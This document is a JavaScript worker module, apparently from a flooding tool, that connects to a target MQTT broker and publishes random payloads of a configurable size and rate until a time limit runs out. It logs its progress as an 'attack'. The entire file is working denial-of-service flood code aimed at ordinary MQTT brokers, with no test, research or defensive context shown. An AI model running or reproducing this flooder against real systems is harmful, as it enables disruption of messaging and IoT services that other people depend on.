import { parentPort, workerData } from "worker_threads";
import mqtt from "mqtt";
import { randomString } from "../utils/randomUtils.js";

const startAttack = () => {
  const { target, duration, packetDelay, packetSize, topic } = workerData;
  const fixedTarget = target.startsWith("mqtt://") || target.startsWith("mqtts://")
    ? target
    : `mqtt://${target}`;

  let totalPackets = 0;
  const startTime = Date.now();
  const mqttTopic = topic || "mqtt/attack";

  // Send an initial log message
  parentPort.postMessage({ log: "Preparing MQTT attack...", totalPackets });

  const client = mqtt.connect(fixedTarget);

  client.on("connect", () => {
    parentPort.postMessage({ log: `Connected to MQTT broker at ${fixedTarget}`, totalPackets });

    const interval = setInterval(() => {
      const elapsedTime = (Date.now() - startTime) / 1000;
      if (elapsedTime >= duration) {
        clearInterval(interval);
        client.end();
        parentPort.postMessage({ log: "Attack finished", totalPackets });
        process.exit(0);
      }
      const payload = randomString(packetSize);
      client.publish(mqttTopic, payload, { qos: 0 }, (err) => {
        if (err) {
          parentPort.postMessage({
            log: `❌ Publish failed on topic ${mqttTopic}: ${err.message}`,
            totalPackets,
          });
        } else {
          totalPackets++;
          parentPort.postMessage({
            log: `✅ Published message to ${mqttTopic} on ${fixedTarget}`,
            totalPackets,
          });
        }
      });
    }, packetDelay);
  });

  client.on("error", (err) => {
    parentPort.postMessage({
      log: `❌ Connection error on ${fixedTarget}: ${err.message}`,
      totalPackets,
    });
  });
};

if (workerData) {
  startAttack();
}
